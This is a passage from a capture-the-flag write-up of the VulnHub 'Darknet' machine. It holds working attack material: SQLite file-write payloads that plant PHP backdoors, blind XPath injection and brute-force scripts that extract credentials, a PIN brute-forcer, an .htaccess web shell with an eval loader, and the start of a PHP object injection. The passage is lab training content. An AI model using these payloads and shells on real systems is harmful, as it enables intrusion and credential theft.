&lt;p&gt;3 hits for &lt;code&gt;/css&lt;/code&gt;, &lt;code&gt;/img&lt;/code&gt; and &lt;code&gt;/includes&lt;/code&gt;. Considering I had the VirtualHost configuration file, I also knew that these paths are most probably relative to the DocumentRoot at &lt;code&gt;/home/devnull/public_html&lt;/code&gt;. Now, all I had to do was modify the payload as explained in the blogpost and cross my fingers. Without boring you with the nitty gritty details, I finally managed to figure out that I can write to the &lt;code&gt;/img&lt;/code&gt; directory and gain some code execution.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;ATTACH DATABASE &#39;/home/devnull/public_html/img/phpinfo.php&#39; as pwn;
CREATE TABLE pwn.shell (code TEXT);
INSERT INTO pwn.shell (code) VALUES (&#39;&amp;lt;?php phpinfo(); ?&amp;gt;&#39;);
&lt;/code&gt;&lt;/pre&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/darknet_888_phpinfo.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Yeah&amp;hellip; look at that. The amount of &lt;code&gt;disable_functions&lt;/code&gt; values explain why my initial &lt;code&gt;system()&lt;/code&gt; type PHP shells were failing. Nonetheless, I was still able to browse the filesystem with a very rudementary script injected using the SQL shell I still had. The payload was as follows that allowed me to browse around and cat things.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;ATTACH DATABASE &#39;/home/devnull/public_html/img/files.php&#39; as pwn;
CREATE TABLE pwn.shell (code TEXT);
INSERT INTO pwn.shell (code) VALUES (&amp;quot;&amp;lt;?php if($_GET[&#39;a&#39;] == &#39;ls&#39;) { print_r(scandir($_GET[&#39;p&#39;])); } if($_GET[&#39;a&#39;] == &#39;cat&#39;) { print_r(readfile($_GET[&#39;p&#39;])); } ?&amp;gt;&amp;quot;);
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Looking at the &lt;code&gt;phpinfo()&lt;/code&gt; output, I also noticed the &lt;code&gt;open_basedir&lt;/code&gt; value was set to &lt;code&gt;/etc/apache2:/home/devnull:/tmp&lt;/code&gt;. This is kinda what motivated me to slap together that quick file browsing script so that I can see whats so interesting in &lt;code&gt;/etc/apache2&lt;/code&gt; (especially since we already had this one vhost config requirement to get to this stage).&lt;/p&gt;

&lt;p&gt;Lastly, I also learnt that we are currently the &lt;code&gt;devnull&lt;/code&gt; user on a Debian Linux box&amp;hellip; Weird. I expected something like &lt;code&gt;www-data&lt;/code&gt; but ok.&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/darknet_888_id.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Getting back to the &lt;code&gt;/etc/apache2&lt;/code&gt; thing, I found another VirtualHost configuration file there in &lt;code&gt;/etc/apache2/sites-available/&lt;/code&gt;. This was done using the &lt;code&gt;files.php&lt;/code&gt; script I wrote and toggling the &lt;code&gt;a&lt;/code&gt; parameter to &lt;code&gt;ls&lt;/code&gt; or &lt;code&gt;cat&lt;/code&gt; as needed. I was not able to find anything else interesting thanks to that epic &lt;code&gt;open_basedir&lt;/code&gt; setting :/&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/darknet_888_signal8.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;h2 id=&#34;signal8-so-much-hate&#34;&gt;signal8. so much hate.&lt;/h2&gt;

&lt;p&gt;I added another entry to my &lt;code&gt;/etc/hosts&lt;/code&gt; and browsed to the new hostname discovered in that configuration file.&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/darknet_signal8_home.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Poking around with the new website had a few points of interest but nothing that had any obvious bugs. The URL &lt;a href=&#34;http://signal8.darknet.com/contact.php?id=1&#34;&gt;http://signal8.darknet.com/contact.php?id=1&lt;/a&gt; had something funny going on with the &lt;code&gt;id&lt;/code&gt; field though I could not confirm if this was another SQL injection bug or not. A &lt;code&gt;robots.txt&lt;/code&gt; also existed for this site and had the entry &lt;code&gt;Disallow: /xpanel/&lt;/code&gt;. Browsing to this I was met with a login page.&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/darknet_signal8_xpanel.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;The login page too did not seem to have any obvious bugs. Some quick scans with &lt;code&gt;nikto&lt;/code&gt;, &lt;code&gt;sqlmap&lt;/code&gt; etc did not show me anything I did not already know.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;fast forward many many hours&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Eventually, I resorted to fuzzing all of the fields in the new site that I have found. I literally tested all of them, but again let me not bore you with the failed attempts ;) I will however detail the path that lead to success.&lt;/p&gt;

&lt;p&gt;To fuzz all of the input fields, I fired up BurpSuite, captured the request to &lt;a href=&#34;http://signal8.darknet.com/contact.php?id=1&#34;&gt;http://signal8.darknet.com/contact.php?id=1&lt;/a&gt; and sent it to Intruder.&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/darknet_signal8_fuzzing.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Intruder was configured to use a simple fuzzing wordlist sourced from &lt;code&gt;/usr/share/wordlists/wfuzz/Injections/All_attack.txt&lt;/code&gt; on Kali Linux from the &lt;code&gt;wordlists&lt;/code&gt; package. Once the attack finished running, I went to the results and sorted them by response size. It was possible to quickly see in this case that those that returned an email address in the body and those that didn&amp;rsquo;t based purely on the size. Using this list, I was able to filter out and realize that the payload of &lt;code&gt;count(/child::node())&lt;/code&gt; managed to return a valid result for the &lt;code&gt;id&lt;/code&gt; parameter.&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/darknet_signal8_xpath_discovery.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;The first time I saw this I had no idea how much time I would be spending on this particular bug. In fact, I have never come across this before so this was &lt;strong&gt;by far&lt;/strong&gt; the most educational portion of the challenge for me!&lt;/p&gt;

&lt;h2 id=&#34;xpath-injection&#34;&gt;xpath injection&lt;/h2&gt;

&lt;p&gt;Just googling the term &lt;em&gt;count(/child::node())&lt;/em&gt; quickly revealed that this was something that related to XPath. XPath allows you to query XML datasets much like SQL can query databases. Ok great. Next up was a trip to owasp.org and their article on &lt;a href=&#34;https://www.owasp.org/index.php/XPATH_Injection&#34;&gt;XPATH Injection&lt;/a&gt;. I spent quite a bit of time researching this type of vulnerability. I realized that the case I was dealing with here was blind XPath injection. Much like blind SQL injection, blind XPath injection can also be exploited by running &amp;lsquo;queries&amp;rsquo; that return true/false. The condition for true in this case was the fact that the email address appeared, and false was that it was missing from the response.&lt;/p&gt;

&lt;p&gt;By far, &lt;a href=&#34;http://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Blind%20Xpath%20injection.pdf&#34;&gt;this&lt;/a&gt; PDF was the most useful in getting me to understand the vulnerability in the most depth.&lt;/p&gt;

&lt;p&gt;Before I could exploit this bug though, I had to come up with a way to test the theories that I was reading about locally. To do this, I copied some XML that I found in one of the articles to start.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;utf-8&amp;quot;?&amp;gt;
&amp;lt;Employees&amp;gt;
   &amp;lt;Employee ID=&amp;quot;1&amp;quot;&amp;gt;
      &amp;lt;FirstName&amp;gt;Arnold&amp;lt;/FirstName&amp;gt;
      &amp;lt;LastName&amp;gt;Baker&amp;lt;/LastName&amp;gt;
      &amp;lt;UserName&amp;gt;ABaker&amp;lt;/UserName&amp;gt;
      &amp;lt;Password&amp;gt;SoSecret&amp;lt;/Password&amp;gt;
      &amp;lt;Type&amp;gt;Admin&amp;lt;/Type&amp;gt;
   &amp;lt;/Employee&amp;gt;
   &amp;lt;Employee ID=&amp;quot;2&amp;quot;&amp;gt;
      &amp;lt;FirstName&amp;gt;Peter&amp;lt;/FirstName&amp;gt;
      &amp;lt;LastName&amp;gt;Pan&amp;lt;/LastName&amp;gt;
      &amp;lt;UserName&amp;gt;PPan&amp;lt;/UserName&amp;gt;
      &amp;lt;Password&amp;gt;NotTelling&amp;lt;/Password&amp;gt;
      &amp;lt;Type&amp;gt;User&amp;lt;/Type&amp;gt;
   &amp;lt;/Employee&amp;gt;
&amp;lt;/Employees&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I then wrote a small PHP script that would allow me to test payloads as if it were injected into the XML on the site I have with the bug. This script looked as follows:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;lt;?php

// Get the argument from the cli
$id = $argv[1];
$xpath = &#39;//Employee[@ID=&#39; . $id . &#39;]/UserName&#39;;

// Be a little verbose about what the query will look like
print &#39;Injection    : &#39; . $id . PHP_EOL;
print &#39;Xpath        : &#39; . $xpath . PHP_EOL;
$xml = simplexml_load_file(&#39;test.xml&#39;);
print PHP_EOL;

// Run the XPath
$result = $xml-&amp;gt;xpath($xpath);

// Return a result of the XPath was valid etc.
print &#39;Blind:&#39; . PHP_EOL;
@print_r((string)$result[0]);

print PHP_EOL . PHP_EOL;

// Show the raw result of the XPath not filtered
print &#39;Raw:&#39; . PHP_EOL;
print_r($result);
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I studied some XPath functions available on &lt;a href=&#34;http://devdocs.io/xslt_xpath-xpath-functions/&#34;&gt;devdocs.io&lt;/a&gt;. This reference together with what I read online as well as my small test scenario helped me figure that I could make use of the &lt;a href=&#34;http://devdocs.io/xslt_xpath/xpath/functions/starts-with&#34;&gt;starts-with()&lt;/a&gt; XPath function to test for true/false scenarios. This proved to work in my little test environment.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@kali:~/data/VulnHub/Darknet# php readxml.php &amp;quot;1 and starts-with(name(*[1]),&#39;F&#39;)=1&amp;quot;
Injection    : 1 and starts-with(name(*[1]),&#39;F&#39;)=1
Xpath        : //Employee[@ID=1 and starts-with(name(*[1]),&#39;F&#39;)=1]/UserName

Blind:
ABaker

Raw:
Array
(
    [0] =&amp;gt; SimpleXMLElement Object
        (
            [0] =&amp;gt; ABaker
        )

)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;To test this scenario on Darknet, I took a guess at the node name of the field that is being returned as &lt;code&gt;email&lt;/code&gt; considering its an email address that is being returned. It is possible to brute force these names as you will see later.
To start testing the feasibility of the blind boolean based injection, I entered the payload &lt;code&gt;1 and starts-with(email, &#39;e&#39;)&lt;/code&gt; into the URL.&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/darknet_signal8_xpath_booltest.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Boom. The email address is returned! This meant that I could run over a large key space and brute force other parts of the underlying XML, hoping to learn more of its structure. For clarities sake, the &lt;code&gt;starts-with()&lt;/code&gt; function will later be expanded to be something like &lt;code&gt;1 and starts-with(email, &#39;errorlevel&#39;)&lt;/code&gt;. Using the payload &lt;code&gt;2 and starts-with(email, &#39;d&#39;)&lt;/code&gt; will also return the &lt;code&gt;devnull@darknet.com&lt;/code&gt; email address as that email starts with &lt;code&gt;d&lt;/code&gt; which makes the XPath query true.&lt;/p&gt;

&lt;p&gt;I was not going to test all of these characters by hand, nope. I had to figure out what this XML looks like, so I wrote some scripts to help with that. The first script attempts to brute force the names of the current node as well as the parent node. If we have these names we can call them in an XPath query by name. For eg, &lt;code&gt;//parent/current/attribute&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;import requests
import string
import sys

entry_point = &#39;http://signal8.darknet.com/contact.php&#39;

payloads = {
    # . == current node and .. == parent node
    &#39;CurrentNode&#39;: &#39;1 and starts-with(name(.),&amp;quot;{exfil}&amp;quot;)=1&#39;,
    &#39;ParentNode&#39;: &#39;1 and starts-with(name(..),&amp;quot;{exfil}&amp;quot;)=1&#39;,
}


def w(t):
    sys.stdout.write(t)
    sys.stdout.flush()


for payload_type, payload in payloads.iteritems():

    w(&amp;quot;\n{}: &amp;quot;.format(payload_type))

    stop = False
    exfil = &#39;&#39;
    while not stop:

        stop = True

        for char in string.printable:
            r = requests.get(
                entry_point, params={
                    &#39;id&#39;: payload.format(exfil=(exfil + char))
                })
            if &#39;darknet.com&#39; in r.text:
                exfil += char
                w(char)
                stop = False

print &amp;quot;\nDone&amp;quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The script in action, determining that the XML has the structure &lt;code&gt;//auth/user&lt;/code&gt;:
&lt;script type=&#34;text/javascript&#34; src=&#34;https://asciinema.org/a/ckyep1yvit8jxfo5fqbfxzn3u.js&#34; id=&#34;asciicast-ckyep1yvit8jxfo5fqbfxzn3u&#34; async&gt;&lt;/script&gt;&lt;/p&gt;

&lt;p&gt;I was now able to theorize that the XML may have the following structure when calling user information. &lt;code&gt;//auth/user[@id=1]/email&lt;/code&gt; where &lt;code&gt;1&lt;/code&gt; is the ID of the user in question. I knew about the &lt;code&gt;email&lt;/code&gt; field as it was &lt;em&gt;almost&lt;/em&gt; obvious. I also discovered the &lt;code&gt;username&lt;/code&gt; field by guessing. I tried to apply the same brute force logic as I did to the values, but for some reason I was not getting any luck with payloads where I was trying to address attributes by position, such as with &lt;code&gt;[*1]&lt;/code&gt; for the first. This did work in my local test environment but not on Darknet. I had everything I needed to get the credentials for login (I think?), but did not have the passwords.&lt;/p&gt;

&lt;p&gt;Eventually I wrote another script to take some words from a wordlist and brute the attribute names, hoping to discover some more attributes!&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;import requests
import string
import sys

entry_point = &#39;http://signal8.darknet.com/contact.php&#39;

payload = &#39;1 and starts-with(name(//auth/user[id=1]/{word}),&amp;quot;{word}&amp;quot;)=1&#39;
with open(&#39;/usr/share/wfuzz/wordlist/general/spanish.txt&#39;) as f:
    for word in f.readlines():
        word = word.strip()
        r = requests.get(entry_point, params={&#39;id&#39;: payload.format(word=word)})
        if &#39;darknet.com&#39; in r.text:
            print &#39;Found attribute: {word}&#39;.format(word=word)

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Having noticed a large part of the sites have been in Spanish, I eventually used a Spanish wordlist and found the field name &lt;code&gt;clave&lt;/code&gt; with it. Urgh, that was mildly frustrating. Anyways, this script in action:
&lt;script type=&#34;text/javascript&#34; src=&#34;https://asciinema.org/a/4fsl2fzb45yhpxxmr6ycwjpfe.js&#34; id=&#34;asciicast-4fsl2fzb45yhpxxmr6ycwjpfe&#34; async&gt;&lt;/script&gt;&lt;/p&gt;

&lt;p&gt;Finally. &lt;code&gt;username&lt;/code&gt; &amp;amp; &lt;code&gt;clave&lt;/code&gt;! As the final piece to this puzzle, I took the original script used to brute force the XML structure and modified the payloads to now brute the values for &lt;code&gt;username&lt;/code&gt; and &lt;code&gt;clave&lt;/code&gt;! The new payloads were:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&#39;username&#39;: &#39;1 and starts-with((//auth/user[id=1]/username),&amp;quot;{exfil}&amp;quot;)=1&#39;,
&#39;password&#39;: &#39;1 and starts-with((//auth/user[id=1]/clave),&amp;quot;{exfil}&amp;quot;)=1&#39;,
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The brute force script in action with the new payloads:
&lt;script type=&#34;text/javascript&#34; src=&#34;https://asciinema.org/a/4obby2xqro3xo8gomfwh427mu.js&#34; id=&#34;asciicast-4obby2xqro3xo8gomfwh427mu&#34; async&gt;&lt;/script&gt;&lt;/p&gt;

&lt;p&gt;So the username and password combination that lets you login at &lt;a href=&#34;http://signal8.darknet.com/xpanel/&#34;&gt;http://signal8.darknet.com/xpanel/&lt;/a&gt; is &lt;code&gt;errorlevel&lt;/code&gt; / &lt;code&gt;tc65Igkq6DF&lt;/code&gt;.&lt;/p&gt;

&lt;h1 id=&#34;the-ploy&#34;&gt;the ploy&lt;/h1&gt;

&lt;p&gt;Once you have logged in, you presented with a page with a login to &lt;em&gt;Editor PHP&lt;/em&gt;.&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/darknet_signal8_xpanel_loggedin.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;The link to &lt;code&gt;edit.php&lt;/code&gt; had little value as it simply appeared to be a &amp;lsquo;troll&amp;rsquo; page. I guess the humor here is the fact that code/os command execution has been relatively painful and this may have been a sign of hope.&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/darknet_signal8_xpanel_troll_edit.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;When I viewed the page sources for the page I got when I just logged it, I saw a hint to a &lt;code&gt;ploy.php&lt;/code&gt; page.&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/darknet_signal8_xpanel_ploy.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Browsing to &lt;code&gt;ploy.php&lt;/code&gt;, I was met with a file upload and a series of checkboxes to tick.&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/darknet_signal8_xpanel_ploy_upload.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;It very quickly became obvious that you have to select the right combination of checkboxes in order to be allowed to upload anything. Each checkbox had a numeric value, so I copied this out into a script and proceeded to try all of the combinations possible. I knew a combination was correct if the Spanish term &lt;em&gt;Key incorrecta!&lt;/em&gt; was not in the response. With some manual fiddling, I also learnt that the key was 4 integers long. Attempting a combination with more or less than 4 keys meant that the HTTP response had &lt;em&gt;La longitud de la clave no es la correcta!&lt;/em&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;import requests
import itertools
import sys

VALUES = [37, 12, 59, 58, 72, 17, 22, 10, 99]
PIN = None

s = requests.Session()


def w(text):
    sys.stdout.write(&#39;\r&#39; + text)
    sys.stdout.flush()


# Need a valid session before we can continue.
print(&#39;[+] Logging in&#39;)
s.post(&#39;http://signal8.darknet.com/xpanel/index.php&#39;, data={
    &#39;username&#39;: &#39;errorlevel&#39;,
    &#39;password&#39;: &#39;tc65Igkq6DF&#39;,
})

print(&#39;[+] Bruting PIN Code ...&#39;)
for c in itertools.permutations(VALUES, 4):
    w(&amp;quot;{pin}&amp;quot;.format(pin=&#39;, &#39;.join(map(str, c))))
    r = s.post(&#39;http://signal8.darknet.com/xpanel/ploy.php&#39;,
               files={&#39;imag&#39;: open(&#39;test_image.png&#39;, &#39;rb&#39;)},
               data={
                   &#39;checkbox[]&#39;: c,
                   &#39;Action&#39;: &#39;Upload&#39;,
               })

    if &#39;incorrecta&#39; not in r.text:
        print(&#39;\n[+] Found pin: {pin}&#39;.format(pin=&#39;, &#39;.join(map(str, c))))
        break

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Seeing this script in action would look as follows:
&lt;script type=&#34;text/javascript&#34; src=&#34;https://asciinema.org/a/13eq1usld7zxx2yoj55khbhwp.js&#34; id=&#34;asciicast-13eq1usld7zxx2yoj55khbhwp&#34; async&gt;&lt;/script&gt;&lt;/p&gt;

&lt;p&gt;So the pin code was &lt;code&gt;37, 10, 59, 17&lt;/code&gt;. Easy.&lt;/p&gt;

&lt;p&gt;The next obvious step was to try and figure out how we can weaponize this file upload, if at all. The file upload appeared to accept most uploads except for those ending in .php. Uploading a PHP script would return the error &lt;em&gt;Formato invalido!&lt;/em&gt; Things like images (or almost anything that was not useful) responded with &lt;em&gt;Subida exitosa!&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;I managed to discover a &lt;code&gt;uploads/&lt;/code&gt; directory with &lt;code&gt;gobuster&lt;/code&gt; again that helped me locate the uploaded files that I was uploading. The filenames appeared to remain intact which made things a little easier. But, this did not help me. I really hoped for some code execution.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;fast forward even more hours&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Eventually, I came across some PHP file upload bypass techniques that involve &lt;code&gt;.htaccess&lt;/code&gt; files. The premise being that if its possible to write/overwrite a folders &lt;code&gt;.htaccess&lt;/code&gt;, then it may be possible to &lt;a href=&#34;http://www.justanotherhacker.com/2011/05/htaccess-based-attacks.html&#34;&gt;add a tiny backdoor shell&lt;/a&gt; to a folder. Sneaky! The only real requirement was that the VirtualHost configuration had to allow for &lt;code&gt;.htaccess&lt;/code&gt; files to be read. As I had already downloaded the configuration file for signal8.darknet.com, I could quickly see that &lt;code&gt;AllowOverride&lt;/code&gt; was set to &lt;code&gt;All&lt;/code&gt;. Fantastic!&lt;/p&gt;

&lt;p&gt;I picked a shell from the &lt;a href=&#34;https://github.com/wireghoul/htshells&#34;&gt;https://github.com/wireghoul/htshells&lt;/a&gt; repository &lt;a href=&#34;https://github.com/wireghoul/htshells/blob/master/shell/mod_php.shell.htaccess&#34;&gt;here&lt;/a&gt;. From my previous testing, I wrote a small uploader so that I wouldn&amp;rsquo;t have to click those checkboxes all the time.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;import requests
import sys
import os.path as path

s = requests.Session()


def w(text):
    sys.stdout.write(&#39;\r&#39; + text)
    sys.stdout.flush()


print(&#39;[+] Logging in ...&#39;)
s.post(&#39;http://signal8.darknet.com/xpanel/index.php&#39;, data={
    &#39;username&#39;: &#39;errorlevel&#39;,
    &#39;password&#39;: &#39;tc65Igkq6DF&#39;,
})

print(&#39;[+] Uploading : {file}&#39;.format(file=sys.argv[1]))
r = s.post(&#39;http://signal8.darknet.com/xpanel/ploy.php&#39;,
           files={&#39;imag&#39;: open(sys.argv[1], &#39;rb&#39;)},
           data={
               &#39;checkbox[]&#39;: [37, 10, 59, 17],
               &#39;Action&#39;: &#39;Upload&#39;,
           })

if &#39;Subida exitosa&#39; in r.text:
    print(&#39;[+] Upload successful! Try: http://signal8.darknet&#39;
          &#39;.com/xpanel/uploads/{file}&#39;.format(file=path.basename(sys.argv[1])))
elif &#39;Formato invalido&#39; in r.text:
    print(&#39;[!] Upload failed. Invalid format.&#39;)
else:
    print(&#39;[!] Upload failed, unknown error.&#39;)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;All I had to do was runt his script, providing the filename that I want to upload and viola.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@kali:~/data/VulnHub/Darknet# python bruteUploader.py .htaccess
[+] Logging in ...
[+] Uploading : .htaccess
[+] Upload successful! Try: http://signal8.darknet.com/xpanel/uploads/.htaccess
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Once uploaded, I browsed to the location and was met with what looks like some code execution again!&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/darknet_signal8_xpanel_shell.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;As expected, the OS command execution does not work due to all those &lt;code&gt;disable_functions&lt;/code&gt;, but we have PHP code execution so that was a start! I decided that for this one I wanted to try get a more fully featured shell working. So, I edited the &lt;code&gt;.htaccess&lt;/code&gt; to include a web shell that &lt;a href=&#34;https://gist.github.com/leonjza/8e9d16c84cf70014c4f36d8f95f9836e&#34;&gt;I was working quite some time ago&lt;/a&gt; (and finally kinda finished). I packed the shell and replaced the PHP in the &lt;code&gt;.htaccess&lt;/code&gt; with the more fully featured shells packed source.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;# &amp;lt;!--  Self contained .htaccess web shell - Part of the htshell project
# Written by Wireghoul - http://www.justanotherhacker.com

# Override default deny rule to make .htaccess file accessible over web
&amp;lt;Files ~ &amp;quot;^\.ht&amp;quot;&amp;gt;
# Uncomment the line below for Apache2.4 and newer
# Require all granted
    Order allow,deny
    Allow from all
&amp;lt;/Files&amp;gt;

# Make .htaccess file be interpreted as php file. This occur after apache has interpreted
# the apache directoves from the .htaccess file
AddType application/x-httpd-php .htaccess

###### SHELL ###### --&amp;gt;&amp;lt;?php eval(base64_decode(&amp;quot;LONG BASE64 ENCODED STRING&amp;quot;));
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Uploaded this with my upload helper and boom, a better shell.&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/darknet_signal8_xpanel_shell2.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;h2 id=&#34;the-last-hurdle-s&#34;&gt;the last hurdle(s)&lt;/h2&gt;

&lt;p&gt;Wtf. The current user is &lt;code&gt;errorlevel&lt;/code&gt;&amp;hellip; I double checked and saw that previously we were the &lt;code&gt;devnull&lt;/code&gt; user. This had me pretty confused in the beginning and had me spend quite a bit of time to figure out how this is possible. From the &lt;code&gt;phpinfo()&lt;/code&gt; output we had no &lt;code&gt;open_basedir&lt;/code&gt; restriction so that allowed me to move around the filesystem much more freely than before. I also noticed that I am not able to access the home directory for the &lt;code&gt;errorlevel&lt;/code&gt; user so I couldn&amp;rsquo;t really figure out what was going on in there (the red color indicates read/write is not possible).&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/darknet_signal8_xpanel_homedirs.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Eventually, I discovered the use of &lt;a href=&#34;http://www.suphp.org/&#34;&gt;suPHP&lt;/a&gt; as a loaded module. This basically means that the PHP script will run as the owner of the file. So with that theory, its sane to assume that because &lt;code&gt;errorlevel&lt;/code&gt; owns the PHP files in the users home directory, that is why I am seen as that user too.&lt;/p&gt;

&lt;p&gt;Anyways, some more enumeration later, I discover some more PHP scripts in &lt;code&gt;/var/www&lt;/code&gt;. These were owned by &lt;code&gt;root&lt;/code&gt;, meaning that if there are any vulnerabilities, I could effectively become root!&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/darknet_signal8_xpanel_var_www.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Due to the fact that these were in &lt;code&gt;/var/www&lt;/code&gt;, I could just browse to the IP address of the VM and run these scripts. Calling the &lt;code&gt;sec.php&lt;/code&gt; script caused the server to return an HTTP 500 error.&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/darknet_sec_error.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;As I was able to read the files in &lt;code&gt;/var/www&lt;/code&gt;, I also downloaded &lt;code&gt;sec.php&lt;/code&gt; to get an idea of what its supposed to be doing.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;lt;?php

require &amp;quot;Classes/Test.php&amp;quot;;
require &amp;quot;Classes/Show.php&amp;quot;;

if(!empty($_POST[&#39;test&#39;])){
    $d=$_POST[&#39;test&#39;];
    $j=unserialize($d);
    echo $j;
}
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The call to &lt;code&gt;unserialize()&lt;/code&gt; immediately hinted me towards what the next step would need to be. I continued to download the files that are required in the &lt;code&gt;Classes/&lt;/code&gt; folder.&lt;/p&gt;

&lt;p&gt;Test.php&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;lt;?php

class Test {

    public $url;
    public $name_file;
    public $path;

    function __destruct(){
        $data=file_get_contents($this-&amp;gt;url);
        $f=fopen($this-&amp;gt;path.&amp;quot;/&amp;quot;.$this-&amp;gt;name_file, &amp;quot;w&amp;quot;);
        fwrite($f, $data);
        fclose($f);
        chmod($this-&amp;gt;path.&amp;quot;/&amp;quot;.$this-&amp;gt;name_file, 0644);
}
}

?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Show.php&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;lt;?php

class Show {

    public $woot;

    function __toString(){
        return &amp;quot;Showme&amp;quot;;        

}
    function Pwnme(){
        $this-&amp;gt;woot=&amp;quot;ROOT&amp;quot;;

}

}

?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;A textbook example of &lt;a href=&#34;https://www.owasp.org/index.php/PHP_Object_Injection&#34;&gt;PHP Object Injection&lt;/a&gt;! I continued to serialize an instance of of the &lt;code&gt;Show&lt;/code&gt; class by copying the class into a new PHP file, instantiating the &lt;code&gt;Show&lt;/code&gt; class and running the &lt;code&gt;serialize()&lt;/code&gt; function over it, printing the output.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;// Source code for poishow.php
&amp;lt;?php

class Show {

    public $woot;

    function __toString(){
        return &amp;quot;Showme&amp;quot;;

}
    function Pwnme(){
        $this-&amp;gt;woot=&amp;quot;ROOT&amp;quot;;

}

}

print_r(serialize(new Show()));
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Running this with a PHP interpreter printed the serialized string.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@kali:~/data/VulnHub/Darknet# php poishow.php
O:4:&amp;quot;Show&amp;quot;:1:{s:4:&amp;quot;woot&amp;quot;;N;}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I now had something I could use to try and test the vulnerability. For the &lt;code&gt;Show&lt;/code&gt; class, we are going to leverage the &lt;code&gt;__toString()&lt;/code&gt; method defined when &lt;code&gt;sec.php&lt;/code&gt; calls &lt;code&gt;echo&lt;/code&gt; on the variable containing the unserialized object. I write &lt;em&gt;yet another python helper&lt;/em&gt; to send the serialized objects to the &lt;code&gt;sec.php&lt;/code&gt; as a POST parameter. This was mostly because I was too lazy to deal with my shell and escaping the quotes etc. :)&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;import requests

OBJECT = &amp;quot;&amp;quot;&amp;quot;O:4:&amp;quot;Show&amp;quot;:1:{s:4:&amp;quot;woot&amp;quot;;N;}&amp;quot;&amp;quot;&amp;quot;

